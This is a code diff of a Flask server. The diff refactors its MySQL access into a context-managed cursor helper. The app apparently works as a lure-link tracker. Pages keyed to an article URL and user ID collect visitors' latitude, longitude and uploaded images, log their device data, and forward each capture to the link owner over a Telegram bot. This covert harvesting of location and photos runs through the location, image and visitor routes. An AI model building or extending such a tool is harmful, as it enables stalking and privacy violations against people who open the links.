@@ -13,7 +13,7 @@ import requests
 import json
 from dotenv import load_dotenv
 from user_agents import parse
-
+from contextlib import contextmanager
 load_dotenv()
 
 log = logging.getLogger('werkzeug')
@@ -27,40 +27,55 @@ app = Flask(__name__)
 CORS(app)
 app.config['PROPAGATE_EXCEPTIONS'] = True
 app.config['SECRET_KEY'] = os.urandom(32)
-conn = mysql.connector.connect(
-    host='localhost',
-    port='3306',
-    user=os.getenv('MYSQL_USER'),
-    password=os.getenv('MYSQL_PASS'),
-    database=os.getenv('MYSQL_DB')
-)
+
 URL = os.getenv('URL')
+
+@contextmanager
+def db_cursor(commit=False, buffered=False):
+    conn = mysql.connector.connect(
+        host='localhost',
+        port='3306',
+        user=os.getenv('MYSQL_USER'),
+        password=os.getenv('MYSQL_PASS'),
+        database=os.getenv('MYSQL_DB')
+    )
+    try:
+        if (buffered == False):
+            with conn.cursor() as cursor:
+                yield cursor
+                if commit:
+                    conn.commit()
+        else:
+            with conn.cursor(buffered=True) as cursor:
+                yield cursor
+                if commit:
+                    conn.commit()
+    finally:
+        conn.close()
 
 # PRE PREPERATION
 def install_tb():
-    cur = conn.cursor()
+    with db_cursor(commit=True) as cur:
+        # MySQL syntax to create the 'log' table
+        create_table_query = """
+        CREATE TABLE IF NOT EXISTS `log` (
+        `id` int NOT NULL AUTO_INCREMENT,
+        `image` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
+        `lat` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
+        `long` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
+        `created_at` timestamp NOT NULL ON UPDATE CURRENT_TIMESTAMP,
+        PRIMARY KEY (`id`)
+        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
+        """
 
-    # MySQL syntax to create the 'log' table
-    create_table_query = """
-    CREATE TABLE IF NOT EXISTS `log` (
-    `id` int NOT NULL AUTO_INCREMENT,
-    `image` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
-    `lat` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
-    `long` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
-    `created_at` timestamp NOT NULL ON UPDATE CURRENT_TIMESTAMP,
-    PRIMARY KEY (`id`)
-    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
-    """
+        try:
+            # Execute the create table query
+            cur.execute(create_table_query)
+            print("Table 'log' created successfully!")
+        except mysql.connector.Error as error:
+            print(f"Error creating table: {error}")
 
-    try:
-        # Execute the create table query
-        cur.execute(create_table_query)
-        print("Table 'log' created successfully!")
-    except mysql.connector.Error as error:
-        print(f"Error creating table: {error}")
-
-    # Close the cursor and connection
-    cur.close()
+        # Close the cursor and connection
     # conn.close()
     
 def get_hostname_and_tld(url):
@@ -146,11 +161,9 @@ def index():
     article = request.args.get("article")
     user_id = request.args.get("userId") if request.args.get("userId") is not None else "Unknown"
     
-    cur = conn.cursor()
-    cur.execute("SELECT * FROM `urls` WHERE `url` = %s and user_id = %s;", [article, user_id])
-    result = cur.fetchone()
-    conn.commit()
-    cur.close()
+    with db_cursor(commit=True) as cur:
+        cur.execute("SELECT * FROM `urls` WHERE `url` = %s and user_id = %s;", [article, user_id])
+        result = cur.fetchone()
 
     if result is None:
         return render_template('404.html')
@@ -185,21 +198,19 @@ def location():
     accuracy = request.form["accuracy"]
     
     # log to DB
-    cur = conn.cursor()
-    cur.execute("SELECT * FROM `urls` WHERE `url` = %s;", [url])
-    get_url = cur.fetchone()
-    url_id = get_url[0]
-    
-    cur.execute("INSERT INTO log (url_id, lat, `long`,`accuracy`, created_at) VALUES (%s, %s, %s, %s, %s)", [
-        url_id,
-        lat,
-        long,
-        accuracy,
-        datetime.datetime.now()
-    ])
-    conn.commit()
-    last_insert_id = cur.lastrowid
-    cur.close()
+    with db_cursor(commit=True) as cur:
+        cur.execute("SELECT * FROM `urls` WHERE `url` = %s;", [url])
+        get_url = cur.fetchone()
+        url_id = get_url[0]
+        
+        cur.execute("INSERT INTO log (url_id, lat, `long`,`accuracy`, created_at) VALUES (%s, %s, %s, %s, %s)", [
+            url_id,
+            lat,
+            long,
+            accuracy,
+            datetime.datetime.now()
+        ])
+        last_insert_id = cur.lastrowid
     
     print("[!] Location :", f'Latitude:{lat}, Longitude: {long}')
     return {
@@ -218,23 +229,19 @@ def image():
     open(file_path, 'wb').write(image)
     print(f"[!] Image : http://127.0.0.1:5000/{file_path}")
     
-    cur = conn.cursor()
-    cur.execute("UPDATE log SET image = %s WHERE id = %s", [file_path, last_insert_id])
-    conn.commit()
-    cur.close()
+    with db_cursor(commit=True, buffered=True) as cur:
+        cur.execute("UPDATE log SET image = %s WHERE id = %s", [file_path, last_insert_id])
     
-    cur = conn.cursor(buffered=True)
-    cur.execute("SELECT * FROM `urls` WHERE `url` = %s and `user_id` = %s;", [url, user_id])
-    data_url = cur.fetchone()
-    
-    cur.execute("SELECT * FROM `log` WHERE `url_id` = %s order by id desc;", [data_url[0]])
-    log_user = cur.fetchone()
-    
-    cur.execute("SELECT * FROM `visitors` WHERE `url_id` = %s order by id desc;", [data_url[0]])
-    visitor = cur.fetchone()
-    
-    cur.close()
-    
+    # cur = conn.cursor(buffered=True)
+        cur.execute("SELECT * FROM `urls` WHERE `url` = %s and `user_id` = %s;", [url, user_id])
+        data_url = cur.fetchone()
+        
+        cur.execute("SELECT * FROM `log` WHERE `url_id` = %s order by id desc;", [data_url[0]])
+        log_user = cur.fetchone()
+        
+        # cur.execute("SELECT * FROM `visitors` WHERE `url_id` = %s order by id desc;", [data_url[0]])
+        # visitor = cur.fetchone()
+        
     telegram_bot_sendtext(data_url[2], textTemplate(log_user))
     textTemplate(log_user)
     
@@ -253,14 +260,11 @@ def visitor():
     # device = DeviceDetector(ua).parse()
     # json = device
     
-    cur = conn.cursor()
-    cur.execute("SELECT * FROM `urls` WHERE `url` = %s and `user_id` = %s;", [url, user_id])
-    data_url = cur.fetchone()
-    
-    cur = conn.cursor()
-    cur.execute("INSERT INTO `visitors` (`url_id`, `json`, `created_at`) VALUES (%s, %s, %s);", [data_url[0], json, datetime.datetime.now()])
-    conn.commit()
-    cur.close()
+    with db_cursor(commit=True) as cur:
+        cur.execute("SELECT * FROM `urls` WHERE `url` = %s and `user_id` = %s;", [url, user_id])
+        data_url = cur.fetchone()
+        
+        cur.execute("INSERT INTO `visitors` (`url_id`, `json`, `created_at`) VALUES (%s, %s, %s);", [data_url[0], json, datetime.datetime.now()])
     
     return {
         "message": "OK",
